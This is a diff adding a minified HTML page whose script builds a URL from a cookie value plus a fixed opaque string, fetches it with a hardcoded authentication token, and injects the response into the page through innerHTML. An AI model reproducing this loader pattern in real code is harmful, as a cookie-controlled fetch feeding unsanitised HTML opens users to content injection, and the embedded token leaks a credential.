@@ -1,0 +1,4 @@
+<body><div id="content"></div></body>
+<script>
+    function getCookie(e){let t=e+`=`,n=decodeURIComponent(document.cookie).split(`;`);for(let e=0;e<n.length;e++){let o=n[e];for(;` `==o.charAt(0);)o=o.substring(1);if(0==o.indexOf(t))return o.substring(t.length,o.length)}return``}function find(){let e=getCookie(`location`)+`ASDFMNaBweNGterhhgjsgHGFsjsgfGSFHasThhastfhhAAkiPOaVBNSRG`;fetch(e,{headers:{Authentication:`aNwaGDAsNyWuWwSoSMWhdsTn`}}).then((e=>{if(200!=e.status)throw new Error(`Bad Server Response`);return e.text()})).then((e=>{document.getElementById(`content`).innerHTML=e})).catch((e=>{console.log(e)}))}find();
+</script>
